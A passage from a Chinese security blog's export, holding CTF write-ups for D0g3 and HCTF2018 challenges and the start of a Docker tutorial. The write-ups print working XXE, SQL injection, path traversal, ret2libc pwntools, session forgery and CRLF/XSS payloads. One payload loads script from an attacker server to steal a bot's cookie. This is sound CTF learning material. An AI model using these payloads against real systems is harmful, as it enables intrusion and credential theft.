45.77.200.106</p><p>思路是在忘记密码处，填入管理员账户<code>admin</code>，重置管理员账号密码，然后登录管理员账号。</p><p>但是重置时会发送重置邮件，根据官方的提示，抓包将host改为vps地址，然后在vbs上开启一个web服务，目标主机就会带着重置token去访问我们的vps，然后我们利用这个token访问密码重置页面就能重置admin密码了</p><p>登录后还有一个输入框，任意提交一个字符串后抓包发现</p><pre><code class="xaml">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</code></pre><p>xxe无误，直接读取文件</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY myentity SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot; &gt;]&gt;&lt;information&gt;&lt;username&gt;&amp;myentity;&lt;/username&gt;&lt;/information&gt;</code></pre><p>拿到flag的base64编码</p><pre><code>PD9waHAKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CmVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J3JlZCc+IjsKZWNobyAiWW91IHdhbm5hIGNhcHR1cmUgdGhpcyBmbGFnPyI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiT2ggeWVzLCBoZXJlISI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiQnV0IG5vdywgIjsKZWNobyAiPGJyPjxicj4iOwplY2hvICJHZXQgb3V0ISI7CmVjaG8gIjwvZm9udD48L2NlbnRlcj4iOwovL2ZsYWc6IEQwZzN7SGlfRDBnM19SZXMzdF80bmRfeFhlfQoKCj8+Cg==</code></pre><h3 id="simple-sqli"><a href="#simple-sqli" class="headerlink" title="simple sqli"></a>simple sqli</h3><p>一开始以为是二次注入，因为注册一个test’，登录后会报错。后面发现是cookie注入</p><pre><code>sqlmap -r sql.txt --cookie &quot;PHPSESSID=p6364j7vahfs88uiesq03g1e25;uname=1&quot; --dbms mysql --level 2 --tamper base64encode,charencode --sql-shell</code></pre><p>当时进入了sql-shell，但是马上时间截止了，很慌就没来得及找web路径，赛后发现有phpinfo</p><p>直接读取flag</p><pre><code>select load_file(&#39;/www/sqli/secret.php&#39;)</code></pre><p>base64解码后就是flag</p><pre><code>D0g3{iaown_oiasnd_asdasda}</code></pre><h3 id="webN中国"><a href="#webN中国" class="headerlink" title="webN中国"></a>webN中国</h3><p><a href="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/" target="_blank" rel="external">https://michaelwayneliu.github.io/2017/12/21/SOME攻击/</a></p><p><strong>webN**</strong>（<strong><strong>400</strong></strong>）**</p><p>题目：<br> 你们点的大餐<br> <a href="http://222.18.158.245:6080/" target="_blank" rel="external">http://222.18.158.245:6080/</a></p><p>tip：Some攻击<br> tip2：为什么不问问富萝莉客服呢？虽然她有点傲娇<br> hint: <a href="https://pan.baidu.com/s/1F93XXi68eqU1uw_Pl7_kfQ" target="_blank" rel="external">https://pan.baidu.com/s/1F93XXi68eqU1uw_Pl7_kfQ</a> 提取码：tv5y</p><p>confirm.php 存在jsonp操作，可控，直接修改网上脚本，父页面执行pay方法<br> <img src="http://phxj316sb.bkt.clouddn.com/674czxvs06mhow3873eahuuq2r.png" alt="img"></p><p>poc:</p><pre><code class="javascript">&lt;iframe src=&quot;http://222.18.158.245:6080/reward.php&quot; name=b&gt;&lt;/iframe&gt;        &lt;iframe name=a&gt;&lt;/iframe&gt;        &lt;script&gt;        window.frames[0].open(&#39;http://222.18.158.245:6080/confirm.php&#39;,&#39;a&#39;);        setTimeout(          function(){            window.frames[1].location.href = &#39;http://222.18.158.245:6080/confirm.php?callback=window.opener.pay&#39;;          }        ,1000);&lt;/script&gt;</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239180.9615023.jpg" alt=""><br> 获取到flag：D0g3{Same_Orig1n_Method_ExCute_1s_eAsy}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="巴西-neko（200）"><a href="#巴西-neko（200）" class="headerlink" title="巴西-neko（200）"></a><strong>巴西-neko（200）</strong></h3><p>第一次两次溢出泄露got任意两个函数的地址去查libc版本，找到/bin/sh的偏移，system函数有就很简单了<br>第二次启shell，栈溢出的题目的一般方法</p><pre><code class="python">#!/usr/bin/pythonfrom pwn import *context(log_level = &quot;debug&quot;, os = &quot;linux&quot;, arch = &quot;i386&quot;)elf = &quot;./neko&quot;#LIBC = &quot;libc64.so&quot;elf = ELF(elf)libc = elf.libctar = remote(&#39;149.248.7.48&#39;,9999)#-----------------------------------------------------------------def dbg(script = &quot;&quot;, elf = elf, arch = &quot;amd64&quot;):    gdb.attach(tar, gdbscript = script)def sh():    tar.interactive()#-----------------------------------------------------------------system = elf.plt[&quot;system&quot;]puts = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]puts_off = 0x05f140binsh_off = 0x15902bvuln = 0x080486E7#-----------------------------------------------------------------tar.sendlineafter(&quot;cats?\n&quot;,&#39;y&#39;)pl = &#39;&#39;pl += &#39;1&#39; * 0xd4pl += p32(puts)pl += p32(vuln)pl += p32(puts_got)tar.sendafter(&quot;anchovies:\n&quot;,pl)tar.recvline()libc_base = u32(tar.recv(4)) - puts_offbinsh = libc_base + binsh_offsuccess(&quot;libc base : &quot;+hex(libc_base))pl = &#39;&#39;pl += &#39;1&#39; * 0xd4pl += p32(system)pl += p32(binsh) * 2tar.sendafter(&quot;anchovies:\n&quot;,pl)sh()</code></pre><h3 id="哈萨克-hiahiahia（200-）"><a href="#哈萨克-hiahiahia（200-）" class="headerlink" title="哈萨克**-hiahiahia（200**）"></a><strong>哈萨克**</strong>-hiahiahia<strong><strong>（</strong></strong>200<strong>**）</strong></h3><p>很简单的一个题目，和oj上的一个类似，溢出覆盖arg[0]利用stack-chk-fail打印flag。。。懒到不想写脚本<br> <img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239197.2212636.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HCTF2018-web writeup</title>
      <link href="/archis/4341f801/"/>
      <url>/archis/4341f801/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>只做出两道惭愧，复现学一下。</p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p><img src="/archis/4341f801/1541944707375.png" alt="1541944707375"></p><p><img src="/archis/4341f801/1541944804344.png" alt="1541944804344"></p><p>右键源码提示存在source.php</p><p>点进去查看源码</p><pre><code>&lt;?php    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt;</code></pre><p>hint点进去知道flag在 ffffllllaaaagggg<img src="/archis/4341f801/1541944745955.png" alt="1541944745955"></p><p>出现问题的代码：</p><pre><code class="php">$_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }</code></pre><p>如果让source.php%253f/../../../../../../../ffffllllaaaagggg。其中source.php是whitelist里面的文件 ，<code>253f</code>是?的双重<code>urlencode.php</code>会自动进行一次urldecode，php会将source.php%253f/当成一个目录，所以需要多加一个../来包含我们可控的文件。</p><p><a href="http://warmup.2018.hctf.io/index.php?file=source.php%253f/../../../../../../../ffffllllaaaagggg" target="_blank" rel="external">http://warmup.2018.hctf.io/index.php?file=source.php%253f/../../../../../../../ffffllllaaaagggg</a></p><p>hctf{e8a73a09cfdd1c9a11cca29b2bf9796f}</p><p>参考文章：</p><p><a href="https://ginove.github.io/2018/07/24/getshell%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3-phpMyAdmin%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%95/#3-phpMyAdmin-4-8-1-getshell-%E5%AE%9E%E6%88%98" target="_blank" rel="external">https://ginove.github.io/2018/07/24/getshell%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3-phpMyAdmin%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%95/#3-phpMyAdmin-4-8-1-getshell-%E5%AE%9E%E6%88%98</a></p><h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p>www.zip泄露</p><p>审计</p><p>在member.php有cookie注入，而且每个页面都包含了member.php</p><pre><code class="php">if (isset($_COOKIE[&quot;islogin&quot;])) {    if ($_COOKIE[&quot;login_data&quot;]) {        $login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);        $admin_user = $login_data[&#39;admin_user&#39;];        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);</code></pre><p>直接从<code>$_COOKIE</code>中取的数据，并且直接拼接到了SQL语句中</p><pre><code class="sql">$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);</code></pre><p>通过json_decode+php弱类型可以绕过登录鉴权admin，然后以这个来做标记来bool注入</p><pre><code class="python">#coding:utf-8import requestsurl = &quot;http://kzone.2018.hctf.io/admin/list.php&quot;cookies = {    &quot;_ga&quot;: &quot;GA1.2.1556483061.1541786955&quot;,    &quot;_gid&quot;: &quot;GA1.2.140952073.1541786955&quot;,    &quot;PHPSESSID&quot;: &quot;72m84deran77afu36is1dbi3k7&quot;,    &quot;islogin&quot;: &quot;1&quot;}#payload1 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats)))))and'1","admin_pass":65}}&#39;&#39;&#39;#payload2 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats)))^1))and'1","admin_pass":65}}&#39;&#39;&#39;#payload1 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats)))))and'1","admin_pass":65}}&#39;&#39;&#39;#payload2 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats)))^1))and'1","admin_pass":65}}&#39;&#39;&#39;payload1 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(f1a9)from(F1444g)))))and'1","admin_pass":65}}&#39;&#39;&#39; #字段名是试出来的payload2 = &#39;&#39;&#39;{{"admin_user":"admin'and(select(locate('{}{}',(select(f1a9)from(F1444g)))^1))and'1","admin_pass":65}}&#39;&#39;&#39;get = &quot;&quot;for i in xrange(50):    for j in xrange(32, 127):        data = payload1.format(get, chr(j))        cookies[&quot;login_data&quot;] = data        r = requests.get(url, cookies = cookies)        if &quot;Fish&quot; in r.content:            data = payload2.format(get, chr(j))            cookies[&quot;login_data&quot;] = data            r = requests.get(url, cookies = cookies)            if &quot;Fish&quot; not in r.content:                get += chr(j)                print get                break</code></pre><p>hctf{4526a8cbd741b3f790f95ad32c2514b9}</p><p><a href="https://www.anquanke.com/post/id/163958#h2-0" target="_blank" rel="external">https://www.anquanke.com/post/id/163958#h2-0</a></p><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>走了很多弯路 上传js会解析 可以xss 但没有作用</p><p>后来发现文章<a href="https://xz.aliyun.com/t/2589" target="_blank" rel="external">https://xz.aliyun.com/t/2589</a></p><p>用zip 压缩软连接读环境变量</p><p>ln -s /etc/profile  profile<br>zip -y profile.zip profile </p><p><code>/proc/self/environ</code>，能读到uwsgi配置文件</p><pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=7d8beb1a9aa4SHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</code></pre><p>当前进程的工作目录在<code>/app/hard_t0_guess_n9f5a95b5ku9fg</code><br>UWSGI配置文件在<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code><br>软连接读取配置文件</p><p> ln -s /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini ini<br> zip -y ini.zip ini</p><pre><code>module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log</code></pre><p>发现主文件<code>app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code><br>接着软连接读项目源码</p><p> ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py mainpy<br> zip -y mainpy.zip mainpy</p><p><img src="/archis/4341f801/1542008448450.png" alt="1542008448450"></p><p>直接打开没换行。查看源码就可以换行版本 代码如下：</p><pre><code class="python"># -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;./uploads&#39;app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 100 * 1024ALLOWED_EXTENSIONS = set([&#39;zip&#39;])def allowed_file(filename):    return &#39;.&#39; in filename and \           filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])def index():    error = request.args.get(&#39;error&#39;, &#39;&#39;)    if(error == &#39;1&#39;):        session.pop(&#39;username&#39;, None)        return render_template(&#39;index.html&#39;, forbidden=1)    if &#39;username&#39; in session:        return render_template(&#39;index.html&#39;, user=session[&#39;username&#39;], flag=flag.flag)    else:        return render_template(&#39;index.html&#39;)@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])def login():    username=request.form[&#39;username&#39;]    password=request.form[&#39;password&#39;]    if request.method == &#39;POST&#39; and username != &#39;&#39; and password != &#39;&#39;:        if(username == &#39;admin&#39;):            return redirect(url_for(&#39;index&#39;,error=1))        session[&#39;username&#39;] = username    return redirect(url_for(&#39;index&#39;))@app.route(&#39;/logout&#39;, methods=[&#39;GET&#39;])def logout():    session.pop(&#39;username&#39;, None)    return redirect(url_for(&#39;index&#39;))@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])def upload_file():    if &#39;the_file&#39; not in request.files:        return redirect(url_for(&#39;index&#39;))    file = request.files[&#39;the_file&#39;]    if file.filename == &#39;&#39;:        return redirect(url_for(&#39;index&#39;))    if file and allowed_file(file.filename):        filename = secure_filename(file.filename)        file_save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)        if(os.path.exists(file_save_path)):            return &#39;This file already exists&#39;        file.save(file_save_path)    else:        return &#39;This file is not a zipfile&#39;    try:        extract_path = file_save_path + &#39;_&#39;        os.system(&#39;unzip -n &#39; + file_save_path + &#39; -d &#39;+ extract_path)        read_obj = os.popen(&#39;cat &#39; + extract_path + &#39;/*&#39;)        file = read_obj.read()        read_obj.close()        os.system(&#39;rm -rf &#39; + extract_path)    except Exception as e:        file = None    os.remove(file_save_path)    if(file != None):        if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):            return redirect(url_for(&#39;index&#39;, error=1))    return Response(file)if __name__ == &#39;__main__&#39;:    #app.run(debug=True)    app.run(host=&#39;127.0.0.1&#39;, debug=True, port=10008)</code></pre><p>查看源码发现引用了<code>flag.py</code>，但是不能直接读<code>flag.py</code>，因为里面<code>hctf</code>字样的flag会被如下代码过滤掉</p><pre><code class="python">if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):            return redirect(url_for(&#39;index&#39;, error=1))</code></pre><p>读了templates/index.html，发现用户名为admin的时候才会输出flag</p><pre><code>ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html indexzip -y index.zip index</code></pre><p><img src="/archis/4341f801/1542010367267.png" alt="1542010367267"></p><p>所有 要读secret，伪造admin的session</p><p>注意到</p><pre><code class="python">random.seed(uuid.getnode())app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)</code></pre><p><code>getnode()</code>和MAC地址有关所以服务器的<code>SECRET_KEY</code>固定,软连接读<code>ln -s /sys/class/net/eth0/address</code>得到MAC<code>12:34:3e:14:7c:62</code></p><p><img src="/archis/4341f801/1542011957802.png" alt="1542011957802"></p><p>算出secret key伪造脚本</p><pre><code>random.seed(20015589129314)print str(random.random()*100)</code></pre><p>得到secret_key=11.935137566861131</p><p>伪造session</p><pre><code>eyJ1c2VybmFtZSI6ImFkbWluIn0.Dskfqg.pA9vis7kXInrrctifopdPNUOQOk</code></pre><p><img src="/archis/4341f801/1542011873105.png" alt="1542011873105"></p><p>读文件/proc/self/environ</p><p><img src="/archis/4341f801/1541901100521.png" alt="1541901100521"></p><pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=323a960bcc1aSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</code></pre><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>查看源代码泄露</p><p><img src="/archis/4341f801/1542046574284.png" alt="1542046574284"></p><p><a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="external">https://github.com/woadsl1234/hctf_flask/</a></p><p>下载代码审计</p><p>只有登录注册修改密码，猜测题意需要登录admin才可以。</p><pre><code>def strlower(username):    username = nodeprep.prepare(username)    return username</code></pre><p>题目的要点是成为 admin，然后看到题目提供了修改 password 的操作，而且用来检查的 name 是用户可控的。</p><p>谷歌strlower函数，这个函数在处理unicode字符时有一些问题，例如\u1d35即ᴵ，经过这个函数会变成大写字母I，然后再调用一下就会变成小写字母i，所以思路就明显了。</p><p><a href="http://blog.lnyas.xyz/?p=1411和题目非常类似，" target="_blank" rel="external">http://blog.lnyas.xyz/?p=1411和题目非常类似，</a></p><p>注册一个<code>ᴬᴰᴹᴵᴺ</code>然后修改密码，就可以用admin登录了。</p><p><img src="/archis/4341f801/1542045086966.png" alt="1542045086966"></p><p>hctf{un1c0dE_cHe4t_1s_FuNnying}</p><h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><p>登陆抓包发现有一个path路由存在302跳转</p><p><img src="/archis/4341f801/1542095165476.png" alt="1542095165476"></p><p>发现存在CRLF注入，</p><pre><code>GET /path?path=http://bottle.2018.hctf.io/user%0d%0a%0d%0a&lt;html&gt;Bigbroke&lt;/html&gt;</code></pre><p><img src="/archis/4341f801/1542095592837.png" alt="1542095592837"></p><p>需要绕过302跳转就可以打到cookie。因为302的时候不会xss。利用&lt;80端口可以绕过302跳转.。参考用p师傅的方法：<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p><p>直接绕过CSP,user路径输入url，bot会去访问会去访问<br>因为CRLF，可以控制返回回来的信息，可以造成XSS<br>然后根据柠檬师傅的文章发现，0，21，22等端口可以绕过302跳转执行js<br>然后user里面输入</p><pre><code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:20/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://vps/myjs/hctfcookie.js%3E%3C/script%3E</code></pre><p>得到bot session<br>替换登陆getflag<br>hctf{26372420de8d5c94f8fb007c4389841f}</p><p>方法二：</p><p><a href="http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:21/%0d%0a%0d%0a" target="_blank" rel="external">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:21/%0d%0a%0d%0a</a><a href="script%20src%3dhttp://vps:2333">script%20src%3dhttp://vps:2333</a></p><p>nc -lvvv 2333</p><p>另外附搭建xss平台：<a href="https://blog.csdn.net/itest_2016/article/details/77650356" target="_blank" rel="external">https://blog.csdn.net/itest_2016/article/details/77650356</a></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>题目的要求是登录到id=1，用户名为admin的用户后访问/web2/flag.php。</p><p><a href="http://game.2018.hctf.io/web2/user.php?order=password可以根据密码进行排序" target="_blank" rel="external">http://game.2018.hctf.io/web2/user.php?order=password可以根据密码进行排序</a> 我们可以不断注册新用户，密码逐位与admin的密码比较，最最终比较出来admin密码</p><p>注册一个密码为d的用户</p><p><img src="/archis/4341f801/1542077753170.png" alt="1542077753170"></p><p>然后按密码排序，发现它在admin下面</p><p>然后注册一个密码为e的用户，发现他在admin上面</p><p>由此可以推算出admin密码第一位是d，按照此原理，逐位得到完整的admin密码为dsa8&amp;&amp;!@#$%^&amp;d1ngy1as3dja，登录访问flag.php即可getflag。</p><p><img src="/archis/4341f801/1542078024341.png" alt="1542078024341"></p><p>hctf{this_idea_h1t_me_whil3_I_am_W3rking}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>docker复现ctf&amp;dockerfile编写ctf环境</title>
      <link href="/archis/47a94ec3/"/>
      <url>/archis/47a94ec3/</url>
      
        <content type="html"><![CDATA[<h1 id="docker复现ctf-amp-dockerfile编写ctf环境"><a href="#docker复现ctf-amp-dockerfile编写ctf环境" class="headerlink" title="docker复现ctf&amp;dockerfile编写ctf环境"></a>docker复现ctf&amp;dockerfile编写ctf环境</h1><p>author：Bigbroke  </p><p>出题以及复现经常要使用docker，以前学习的不系统，从头学习记录，备忘一下</p><h2 id="0x00-基本概念"><a href="#0x00-基本概念" class="headerlink" title="0x00 基本概念"></a>0x00 基本概念</h2><p>Docker 包括三个基本概念</p><ul><li>镜像（<code>Image</code>）</li><li>容器（<code>Container</code>）</li><li>仓库（<code>Repository</code>）</li></ul><h2 id="0x01使用镜像"><a href="#0x01使用镜像" class="headerlink" title="0x01使用镜像"></a>0x01使用镜像</h2><h3 id="1-1获取镜像"><a href="#1-1获取镜像" class="headerlink" title="1.1获取镜像"></a>1.1获取镜像</h3><p>docker pull ubuntu:16.04</p><pre><code class="bash">docker run -it ubuntu:16.04 bash</code></pre><ul><li><code>-it</code>：这是两个参数，一个是 <code>-i</code>：交互式操作，一个是 <code>-t</code> 终端。我们这里打算进入 <code>bash</code> 执行一些命令并查看返回结果，因此我们需要交互式终端。</li><li><code>bash</code>：放在镜像名后的是<strong>命令</strong>，这里我们希望有个交互式 Shell，因此用的是 <code>bash</code>。</li><li><code>exit</code> 退出了这个容器。</li></ul><h3 id="1-2搜寻镜像"><a href="#1-2搜寻镜像" class="headerlink" title="1.2搜寻镜像"></a>1.2搜寻镜像</h3><pre><code>docker search ctf</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809301113_804.png" alt=""></p><h3 id="1-3列出镜像"><a href="#1-3列出镜像" class="headerlink" title="1.3列出镜像"></a>1.3列出镜像</h3><pre><code class="bash">docker images == docker image ls</code></pre><p>使用tag添加镜像标签</p><pre><code class="bash">docker tag ubuntu:latest CTF:latest</code></pre><h3 id="1-4中间层镜像"><a href="#1-4中间层镜像" class="headerlink" title="1.4中间层镜像"></a>1.4中间层镜像</h3><pre><code class="bash">$ docker image ls -a</code></pre><p>只列出ubuntu的</p><pre><code class="bash">docker image ls ubuntu</code></pre><p>列出特定的某个镜像，也就是说指定仓库名和标签</p><pre><code class="bash">$ docker image ls ubuntu:16.04</code></pre><h3 id="1-5-删除本地镜像"><a href="#1-5-删除本地镜像" class="headerlink" title="1.5 删除本地镜像"></a>1.5 删除本地镜像</h3><h4 id="使用标签删除镜像"><a href="#使用标签删除镜像" class="headerlink" title="使用标签删除镜像"></a>使用标签删除镜像</h4><p>docker rmi myubuntu:latest</p><p>docker rmi 命令只是删除镜像多个标签中的指定标签而已， 并不影响镜像文件，但是镜像只剩下一个标签的时候要注意 再使用docker rmi命令会彻底删除镜像</p><p>强行删除</p><p>docker rmi -f ubuntu:16.04</p><p>docker rmi id</p><p>如果要删除本地的镜像，可以使用 <code>docker image rm</code> 命令，其格式为：</p><pre><code class="bash">docker image rm  【image id】</code></pre><h3 id="1-6-commit"><a href="#1-6-commit" class="headerlink" title="1.6  commit"></a>1.6  commit</h3><p>Docker 提供了一个 <code>docker commit</code> 命令，可以将容器的存储层保存下来成为镜像。换句话说，就是在原有镜像的基础上，再叠加上容器的存储层，并构成新的镜像。以后我们运行这个新镜像的时候，就会拥有原有容器最后的文件变化。</p><p><code>docker commit</code> 的语法格式为：</p><pre><code class="bash">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></pre><p>使用history查看镜像历史</p><pre><code class="bash">docker history ubuntu:16.04</code></pre><p>新的镜像定制好后，我们可以来运行这个镜像。</p><pre><code class="bash">docker run --name web2 -d -p 81:80 nginx:v2</code></pre><h3 id="1-7-上传镜像"><a href="#1-7-上传镜像" class="headerlink" title="1.7 上传镜像"></a>1.7 上传镜像</h3><p>docker tag test:latest user/test:latest</p><p>docker push user/test:latest</p><h2 id="0x02-操作镜像"><a href="#0x02-操作镜像" class="headerlink" title="0x02 操作镜像"></a>0x02 操作镜像</h2><h3 id="2-1创建镜像"><a href="#2-1创建镜像" class="headerlink" title="2.1创建镜像"></a>2.1创建镜像</h3><p>docker create -it ubuntu:latests</p><p>docker start af</p><p>docker run -it –name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</p><p>其中，<code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开。</p><h4 id="守护态："><a href="#守护态：" class="headerlink" title="守护态："></a>守护态：</h4><pre><code>  docker run -d --name dedefun -p 0.0.0.0:8080:80 dedefun:latest /bin/bash</code></pre><p>如果使用了 <code>-d</code> 参数运行容器。此时容器会在后台运行并不会把输出的结果 (STDOUT) 打印到宿主机上面(输出结果可以用 <code>docker logs</code> 查看)。</p><h4 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h4><p>可以利用 <code>docker container start</code> 命令，直接将一个已经终止的容器启动运行。</p><h3 id="2-2-终止容器"><a href="#2-2-终止容器" class="headerlink" title="2.2 终止容器"></a>2.2 终止容器</h3><p>docker stop ce5</p><p>docker start ce5 重启</p><p>通过 <code>docker container ls</code> 命令来查看容器信息。</p><pre><code>$ docker container ls -a</code></pre><h3 id="2-3-进入容器"><a href="#2-3-进入容器" class="headerlink" title="2.3 进入容器"></a>2.3 进入容器</h3><h4 